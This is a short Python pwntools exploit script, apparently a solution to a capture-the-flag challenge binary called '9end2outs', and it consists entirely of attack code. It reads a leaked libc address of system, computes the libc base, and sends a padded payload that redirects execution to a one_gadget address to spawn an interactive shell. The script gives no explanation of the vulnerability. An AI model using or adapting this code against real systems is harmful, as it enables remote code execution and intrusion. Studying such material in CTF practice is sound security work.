
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('9end2outs')
r= e.process()
# r = remote('2outs.sstf.site', 1337)
lib = e.libc
# lib= ELF('libc.so.6')

main=0x00000000004011a7
puts_got = 0x404018
puts_plt = 0x401060
pop_rdi_ret= 0x2d3e5
ret=0x000000000040101a
sysplt=0x4004e0
onegg=[0x50a37,0xebcf1,0xebcf5,0xebcf8]
r.sendlineafter(b" > ", b"system")
r.recvuntil(b"'system' is at 0x")
system_libc = int(r.recv(12),16)

r.sendlineafter(b" > ", b"a")

base_libc = system_libc - lib.sym.system
log.info("base_libc: %#x" %base_libc)
# win =base_libc+onegg[0]

win =base_libc+onegg[3]

payload= b"a"*8+p64(win)
pause()
r.sendlineafter(b"selection?\n > ", payload)

r.interactive()
